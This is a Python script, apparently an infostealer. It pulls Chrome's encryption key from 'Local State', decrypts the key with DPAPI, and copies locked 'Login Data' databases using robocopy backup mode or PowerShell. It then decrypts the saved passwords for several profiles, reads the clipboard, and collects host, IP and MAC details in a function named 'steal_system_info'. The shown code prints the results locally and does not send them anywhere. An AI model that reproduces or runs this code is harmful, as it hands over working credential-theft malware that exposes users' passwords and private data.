import os 
import json
import base64
from win32crypt import CryptUnprotectData
import shutil
import sqlite3
from Crypto.Cipher import AES
import pyperclip
import platform
import socket
import re
import uuid
import requests
import subprocess
import time

def copy_locked_file(src_path, dest_path):
    """Copy a file that might be locked by another process"""
    try:
        result = subprocess.run([
            'robocopy', 
            os.path.dirname(src_path), 
            os.path.dirname(dest_path),
            os.path.basename(src_path),
            '/B'  
        ], capture_output=True, text=True)
        
        temp_name = os.path.join(os.path.dirname(dest_path), os.path.basename(src_path))
        if os.path.exists(temp_name):
            if os.path.exists(dest_path):
                os.remove(dest_path)
            os.rename(temp_name, dest_path)
            return True
            
    except Exception as e:
        print(f"Robocopy method failed: {e}")
    
    try:
        ps_command = f'Copy-Item -Path "{src_path}" -Destination "{dest_path}" -Force'
        result = subprocess.run(['powershell', '-Command', ps_command], 
                              capture_output=True, text=True)
        if result.returncode == 0 and os.path.exists(dest_path):
            return True
    except Exception as e:
        print(f"PowerShell copy method failed: {e}")
    
    return False

def get_decryption_key():
    try:
        local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
        with open(local_state_path, 'r', encoding='utf-8') as file:
            local_state = json.loads(file.read())
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        return CryptUnprotectData(encrypted_key, None, None,None,0)[1]
    except Exception as e:
        print(f"Error obtaining decryption key: {e}")
        return None
        

def decrypt_password(password, key):
    try:
        if not password:
            return None
            
        if password.startswith(b'v10') or password.startswith(b'v11'):
            iv = password[3:15]
            encrypted_password = password[15:-16]
            if len(iv) != 12:  
                return None
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(encrypted_password)
            return decrypted_pass.decode('utf-8', errors='ignore')
        elif len(password) > 0:
            try:
                decrypted = CryptUnprotectData(password, None, None, None, 0)[1]
                return decrypted.decode('utf-8', errors='ignore')
            except Exception:
                try:
                    return password.decode('utf-8', errors='ignore')
                except:
                    return None
    except Exception as e:
        print(f'Error decrypting password: {e}')
        return None

def extract_browser_passwords():
    key = get_decryption_key()
    if key is None:
        return []
    
    credentials = []
    profiles = ['Default', 'Profile 1', 'Profile 2']
    base_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data')

    for profile in profiles:
        login_db_path = os.path.join(base_path, profile, 'Login Data')
        if not os.path.exists(login_db_path):
            continue

        conn = None
        temp_db = f'Login_Data_{profile.replace(" ", "_")}.db'
        
        try:
            conn = sqlite3.connect(f'file:{login_db_path}?mode=ro', uri=True)
            print(f"Opened {profile} database in read-only mode")
        except sqlite3.OperationalError:
            try:
                shutil.copy2(login_db_path, temp_db)
                conn = sqlite3.connect(temp_db)
                print(f"Copied {profile} database to temporary file")
            except PermissionError:
                print(f"Permission denied for {profile}. Chrome may be running - trying alternative method...")
                if copy_locked_file(login_db_path, temp_db):
                    try:
                        conn = sqlite3.connect(temp_db)
                        print(f"Used backup mode copy for {profile}")
                    except Exception as e:
                        print(f"Error opening copied file for {profile}: {e}")
                        continue
                else:
                    print(f"Failed to access {profile} - skipping")
                    continue
            except Exception as e:
                print(f"Error accessing {profile}: {e}")
                continue

        if conn:
            try:
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    if encrypted_password: 
                        decrypted_password = decrypt_password(encrypted_password, key) 
                        if decrypted_password:
                            credentials.append({
                                'profile': profile,
                                'url': origin_url,
                                'username': username,
                                'password': decrypted_password
                            })
                cursor.close()
                conn.close()
                print(f"Successfully extracted data from {profile}")
            except Exception as e:
                print(f"Error reading data from {profile}: {e}")
                if conn:
                    conn.close()
            finally:
                if os.path.exists(temp_db):
                    try:
                        os.remove(temp_db)
                    except Exception:
                        pass

    return credentials

def capture_clipboard():
    try:
        clipboard_content = pyperclip.paste()
        return clipboard_content
    except Exception as e:
        print(f"Error capturing clipboard content: {e}")
        return None

def steal_system_info():
    try:
        info = {
            'platform': platform.system(),
            'platform-release': platform.release(),
            'platform-version': platform.version(),
            'architecture': platform.machine(),
            'hostname': socket.gethostname(),
            'ip-address': socket.gethostbyname(socket.gethostname()),
            'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            'processor': platform.processor(),
        }

        try:
            response = requests.get('https://api.ipify.org?format=json')
            global_ip = response.json().get('ip', 'N/A')
            info['global-ip-address'] = global_ip
        except Exception as e:
            print(f'Error fetching global IP address.')
            info['global-ip-address'] = 'Could not fetch global IP address'

        return info
    except Exception as e:
        print("Error capturing syystem info.")
        return {}

if __name__ == '__main__':

    passwords = extract_browser_passwords()
    print("Extracted Browser Password:")
    for cred in passwords:
        print(f"Profile: {cred['profile']}")
        print(f"URL: {cred['url']}")
        print(f"Username: {cred['username']}")
        print(f"Password: {cred['password']}")
        print('-' * 40)

    clipboard_content = capture_clipboard()
    if clipboard_content:
        print('\nClipboard Content:')
        print(clipboard_content)

    system_info = steal_system_info()
    print('\nSystem Information:')
    for key, value in system_info.items():
        print(f'{key}:{value}')

    



